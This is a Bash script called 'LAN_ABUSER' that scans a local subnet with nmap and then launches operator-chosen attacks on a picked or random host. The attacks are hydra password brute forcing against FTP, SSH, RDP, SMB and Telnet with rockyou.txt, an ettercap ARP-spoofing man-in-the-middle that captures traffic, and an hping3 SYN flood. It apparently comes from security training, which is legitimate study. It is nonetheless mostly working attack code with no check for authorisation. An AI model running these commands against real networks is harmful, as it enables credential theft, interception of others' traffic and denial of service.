#!/bin/bash


# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Logging and host exclusion
LOG_FILE="/var/log/attack_log.txt"
NMAP_OUTPUT="/var/log/nmap_scan_results"
EXCLUDE_IP=$(hostname -I | awk '{print $1}')

# Script name
printf "${RED}"
figlet -f slant "LAN_ABUSER" | lolcat
printf "${NC}"

echo -e "\n\n[!] THIS SCRIPT PERFORMS LAN SCANNING AND ATTACKS ON THE NETWORK\n" | lolcat

# Function to check if the script is run as root
CheckForROOT () {
    if [[ $(id -u) -ne 0 ]]; then
        echo -e "${RED}[!] Please run the script with sudo privileges!${NC}"
        exit 1
    fi
}
CheckForROOT

# Function to list network interfaces and get user's choice
ChooseNetworkInterface() {
    echo -e "${CYAN}[*]${NC}${YELLOW} Available network interfaces:${NC}"
    interfaces=($(ip -o link show | awk -F': ' '{print $2}'))
    ip_addresses=()
    valid_interfaces=()
    index=1
    for iface in "${interfaces[@]}"; do
        ip_addr=$(ip -o -4 addr list $iface | awk '{print $4}' | cut -d'/' -f1)
        if [[ ! -z "$ip_addr" ]]; then
            ip_addresses+=("$ip_addr")
            valid_interfaces+=("$iface")
            echo -e "${BLUE}$index) $iface - $ip_addr${NC}"
            ((index++))
        fi
    done

    while true; do
        read -p "$(echo -e "${CYAN}[?]${NC}${YELLOW} Please choose the network interface by number ${NC}")" choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#valid_interfaces[@]}" ]; then
            chosen_iface="${valid_interfaces[$((choice-1))]}"
            ntip="${ip_addresses[$((choice-1))]}"
            echo -e "${CYAN}[+]${NC}${GREEN} You have chosen $chosen_iface with IP $ntip${NC}"
            break
        else
            echo -e "${RED}[!] Invalid choice. Please enter a number between 1 and ${#valid_interfaces[@]}.${NC}"
        fi
    done
}
# Selecting the type of nmap scan to perform
ChooseNetworkInterface

echo -e "${CYAN}[?]${NC}${PURPLE} Please select the type of Nmap scan to perform:${NC}"
echo -e "${BLUE}1) Fast Scan${NC}"
echo -e "${BLUE}2) Full Scan (including UDP ports)${NC}"
echo -e "${BLUE}3) Vulnerability Scan${NC}"
read -p "$(echo -e "${CYAN}[?]${NC}${YELLOW} Choose your scan type (1-3): ${NC}")" scan_type

case $scan_type in
    1)
        scan_command="nmap -F --exclude $EXCLUDE_IP $ntip/24 -oA $NMAP_OUTPUT > /var/log/nmap_scan_results.txt"
        ;;
    2)
        scan_command="nmap -sS -sU -T4 -A --exclude $EXCLUDE_IP $ntip/24 -oA $NMAP_OUTPUT > /var/log/nmap_scan_results.txt"
        ;;
    3)
        scan_command="nmap -sS -sV -O --script=vuln --exclude $EXCLUDE_IP $ntip/24 -oA $NMAP_OUTPUT > /var/log/nmap_scan_results.txt"
        ;;
    *)
        echo -e "${RED}[!] Invalid choice. Performing fast scan by default.${NC}"
        scan_command="nmap -sn --exclude $EXCLUDE_IP $ntip/24 -oA $NMAP_OUTPUT > /var/log/nmap_scan_results.txt"
        ;;
esac

echo -e "\n${RED}NOTICE!!${NC}${YELLOW} Nmap scan on LAN will start in: \n3...${NC}"
sleep 1
echo -e "${YELLOW}2...${NC}"
sleep 1
echo -e "${YELLOW}1...${NC}"
sleep 1

echo -e "${CYAN}[+]${NC}${BLUE} Starting nmap scan...${NC}"
eval $scan_command
echo -e "${GREEN}[*] Nmap scan completed! Results saved to ${NC}${YELLOW}${NMAP_OUTPUT}.*${NC}"

# Extract IP addresses from the grepable output
grep "Status: Up" "${NMAP_OUTPUT}.gnmap" | cut -d ' ' -f2 > "${NMAP_OUTPUT}.txt"
# Attack selection menu
usermenu() {
    echo -e "\n${CYAN}[?]${NC}${PURPLE} Please select an attack to execute:${NC}"
    echo -e "${BLUE}1) Brute Force Attack${NC}"
    echo -e "${GREEN}#${NC}${CYAN} A trial and error attack of applying different usernames and passewords in order to gain unauthorized access${NC}"
    echo -e "${BLUE}2) Man-in-the-Middle Attack${NC}"
    echo -e "${GREEN}#${NC}${CYAN} Secretly relay communications between two parties who believe they are communicating with each other${NC}"
    echo -e "${BLUE}3) Denial of Service Attack${NC}"
    echo -e "${GREEN}#${NC}${CYAN} An attack that floods a machine with traffic with the goal of triggering a crash${NC}"
    echo -e "${BLUE}4) Random Attack${NC}"
    read -p "$(echo -e "\n${CYAN}[?]${NC}${YELLOW} Choose your attack (1-4): ${NC}")" cattack

    chosen_attack
}
# Brute force attack function
BruteForce() {
    echo -e "${CYAN}[*]${NC}${PURPLE} Brute Force Attack Configuration:${NC}"
    echo -e "${BLUE}1) Default settings${NC}"
    echo -e "${BLUE}2) Manual Input${NC}"
    read -p "$(echo -e "${CYAN}[?]${NC}${YELLOW} Choose your option (1-2): ${NC}")" bf_option

    if [[ $bf_option == "2" ]]; then
        read -p "$(echo -e "${RED}[?]${NC}${YELLOW} Enter the username list file path: ${NC}")" user_list
        read -p "$(echo -e "${RED}[?]${NC}${YELLOW} Enter the password list file path: ${NC}")" pass_list
        echo -e "${CYAN}[+]${NC}${BLUE} Starting Brute Force Attack with Manual Input...${NC}"
        hydra -L $user_list -P $pass_list $IP ftp -o /tmp/hydra_results.txt &> /dev/null
	hydra -L $user_list -P $pass_list $IP ssh -o /tmp/hydra_results.txt &> /dev/null
	hydra -L $user_list -P $pass_list $IP rdp -o /tmp/hydra_results.txt &> /dev/null
	hydra -L $user_list -P $pass_list $IP smb -o /tmp/hydra_results.txt &> /dev/null
	hydra -L $user_list -P $pass_list $IP telnet -o /tmp/hydra_results.txt &> /dev/null
        echo "$(date) Brute Force Attack with Manual Input on $IP using $user_list and $pass_list" >> $LOG_FILE
    else
        echo -e "${RED}[!]Preparing rockyou.txt for Brute Force Attack...${NC}"
        cp /usr/share/wordlists/rockyou.txt.gz .
        gunzip rockyou.txt.gz
        echo -e "${CYAN}[+]${NC}${BLUE} Starting Brute Force Attack with Default settings...${NC}"
        hydra -l admin -P rockyou.txt $IP ftp -o /tmp/hydra_results.txt &> /dev/null
	hydra -l admin -P rockyou.txt $IP ssh -o /tmp/hydra_results.txt &> /dev/null
	hydra -l admin -P rockyou.txt $IP rdp -o /tmp/hydra_results.txt &> /dev/null
	hydra -l admin -P rockyou.txt $IP smb -o /tmp/hydra_results.txt &> /dev/null
	hydra -l admin -P rockyou.txt $IP telnet -o /tmp/hydra_results.txt &> /dev/null
        echo "$(date) Brute Force Attack with Default settings on $IP" >> $LOG_FILE
        echo -e "${CYAN}[+]${NC}${BLUE} Cleaning up...${NC}"
        rm rockyou.txt
    fi

    # Extract credentials and add to log file
    grep "host:" /tmp/hydra_results.txt | sed 's/^.*login: //g; s/ password: /:/g' >> $LOG_FILE

    echo -e "${GREEN}[*] Brute Force Attack completed!${NC}"
    post_attack_menu
}
# Man-in-theMiddle attack function
MITM() {
    echo -e "${CYAN}[*]${NC}${PURPLE} Man-in-the-Middle Attack Configuration:${NC}"
    echo -e "${CYAN}[+]${NC}${BLUE} Starting Man-in-the-Middle Attack...${NC}"
    ettercap -T -q -i $chosen_iface -M arp:remote /$IP// -w /tmp/mitm_results.pcap &> /dev/null &
    ettercap_pid=$!

    echo "$(date) Man-in-the-Middle Attack on $IP using interface $chosen_iface" >> $LOG_FILE

    echo -e "${CYAN}[!]${NC}${YELLOW} MITM attack is running. Press Enter to conclude the attack.${NC}"
    read

    if kill -0 $ettercap_pid 2>/dev/null; then
        kill $ettercap_pid
    fi
    echo -e "${GREEN}[*] Man-in-the-Middle Attack concluded.${NC}"
    echo -e "${GREEN}[*] MITM attack data saved to ${NC}${YELLOW}/tmp/mitm_results.pcap${NC}"
    echo "$(date) MITM attack data saved to /tmp/mitm_results.pcap" >> $LOG_FILE

    post_attack_menu
}
# DoS attack function
DenialOfService() {
    echo -e "${CYAN}[*]${NC}${PURPLE} Denial of Service Attack Configuration:${NC}"
    read -p "$(echo -e "${RED}[?]${NC}${YELLOW} Enter the duration for the DoS attack in seconds: ${NC}")" dos_duration
    read -p "$(echo -e "${RED}[?]${NC}${YELLOW} Enter the port for the DoS attack: ${NC}")" dos_port
    echo -e "${CYAN}[+]${NC}${BLUE} Starting Denial of Service Attack on port $dos_port for $dos_duration seconds...${NC}"
    timeout $dos_duration hping3 -S --flood -V -p $dos_port $IP &> /dev/null &
    wait $!
    echo "$(date) Denial of Service Attack on $IP for $dos_duration seconds on port $dos_port" >> $LOG_FILE
    echo -e "${GREEN}[*] Denial of Service Attack completed!${NC}"
    post_attack_menu
}
# post original attack menu function
post_attack_menu() {
    while true; do
        echo -e "${CYAN}[?]${NC}${YELLOW} What would you like to do next?${NC}"
        echo -e "${BLUE}1) Repeat the same attack${NC}"
        echo -e "${BLUE}2) Perform a different attack${NC}"
        echo -e "${BLUE}3) Switch target${NC}"
        echo -e "${BLUE}4) Conclude and exit${NC}"
        read -p "$(echo -e "${CYAN}[?]${NC}${YELLOW} Choose your option (1-4): ${NC}")" post_option

        case $post_option in
            1)
                chosen_attack
                ;;
            2)
                usermenu
                ;;
            3)
                chosen_IP
                usermenu
                ;;
            4)
                save_audit_files
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option. Please choose a valid option${NC}"
                ;;
        esac
    done
}
# Function directing to the appropriate attack function based on user input
chosen_attack() {
    while true; do
        if [[ $cattack == "4" ]]; then 
            cattack=$((RANDOM % 3 + 1))
            echo -e "${CYAN}[*]${NC}${YELLOW} Random attack selected: $cattack${NC}"
        fi

        case $cattack in
            1)
                cattack="bf"
                BruteForce
                ;;
            2)
                cattack="mitm"
                MITM
                ;;
            3)
                cattack="dos"
                DenialOfService
                ;;
            *)
                echo -e "${RED}[!] Invalid option. Please choose a valid option${NC}"
                read -p "$(echo -e "${CYAN}[?]${NC}${YELLOW} Choose your attack (1-4): ${NC}")" cattack
                continue
                ;;
        esac
        break
    done
}

# Function to choose victim IP
chosen_IP() {
    while true; do
        read -p "$(echo -e "${CYAN}[?]${NC}${YELLOW} How would you like to choose your victim? Please enter the number of the preferred way: ${NC}
${BLUE}1) Choose from list
2) Choose random IP from nmap scan results:${NC} 
${CYAN}[?]${NC}${YELLOW} Enter answer here:${NC} ")" ip_way

        if [[ $ip_way == "1" ]]; then
            mapfile -t ips < "${NMAP_OUTPUT}.txt"
            echo -e "${CYAN}[*]${NC}${YELLOW} Available IP addresses:${NC}"
            for i in "${!ips[@]}"; do
                echo -e "${BLUE}$((i+1))) ${ips[$i]}${NC}"
            done
            read -p "$(echo -e "${CYAN}[?]${NC}${YELLOW} Enter the number of the IP address you want to target: ${NC}")" ip_choice
            if [[ $ip_choice -ge 1 && $ip_choice -le ${#ips[@]} ]]; then
                IP="${ips[$((ip_choice-1))]}"
                echo -e "${GREEN}[+] Selected IP: $IP${NC}"
                break
            else
                echo -e "${RED}[!] Invalid selection. Please try again.${NC}"
            fi
        elif [[ $ip_way == "2" ]]; then
            mapfile -t ips < "${NMAP_OUTPUT}.txt"
            if [[ ${#ips[@]} -eq 0 ]]; then
                echo -e "${RED}[!] No IP addresses available in the list.${NC}"
                continue
            fi
            rand_index=$(( RANDOM % ${#ips[@]} ))
            IP="${ips[rand_index]}"
            echo -e "${GREEN}[+] Randomly selected IP: $IP${NC}"
            read -p "$(echo -e "${CYAN}[?]${NC}${YELLOW} Do you want to proceed with this IP? (y/n): ${NC}")" confirm_ip
            if [[ $confirm_ip == "y" ]]; then
                break
            fi
        else
            echo -e "${RED}[!] Invalid option. Please choose either 1 or 2.${NC}"
        fi
    done
}
# Function for convenient file saving in a designated folder
save_audit_files() {
    echo -e "${CYAN}[+]${NC}${YELLOW} Attack log saved to: ${NC}${RED}$LOG_FILE${NC}"
    read -p "$(echo -e "${CYAN}[?]${NC}${YELLOW} Would you like to copy the audit files to a local folder? (y/n): ${NC}")" save_choice
    if [[ $save_choice == "y" ]]; then
        # Create a folder for audit files
        timestamp=$(date +"%Y%m%d_%H%M%S")
        audit_folder="lan_abuser_audit_$timestamp"
        mkdir "$audit_folder"

        # Convert nmap scan results to HTML using xsltproc
        xsltproc "${NMAP_OUTPUT}.xml" -o "$audit_folder/nmap_scan_results.html"

        # Copy generated files to the audit folder
        cp "$LOG_FILE" "$audit_folder/" 2>/dev/null
        cp "${NMAP_OUTPUT}"* "$audit_folder/" 2>/dev/null
        cp "/tmp/hydra_results.txt" "$audit_folder/" 2>/dev/null
        cp "/tmp/mitm_results.pcap" "$audit_folder/" 2>/dev/null

        echo -e "${GREEN}[*] Audit files saved in folder: ${NC}${BLUE}$audit_folder${NC}"
    fi

    echo -e "\n[*] Script execution concluded." | lolcat
}

# Run the functions
chosen_IP
usermenu
